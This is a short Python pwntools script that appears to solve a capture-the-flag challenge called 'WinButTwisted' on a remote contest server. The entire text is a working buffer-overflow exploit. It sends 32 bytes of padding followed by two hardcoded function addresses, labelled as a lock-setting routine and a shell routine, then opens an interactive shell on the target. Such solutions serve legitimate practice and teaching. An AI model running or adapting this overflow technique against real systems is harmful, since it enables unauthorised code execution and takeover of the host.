from pwn import *

conn = remote('pwn.heroctf.fr',9003)
#r = process("./WinButTwisted")
conn.recvline() 

buf = b"A" * 32
# set_lock_addr
buf += p32(0x08049965)
# shell_addr
buf += p32(0x08049999)

conn.sendline(buf)
conn.interactive()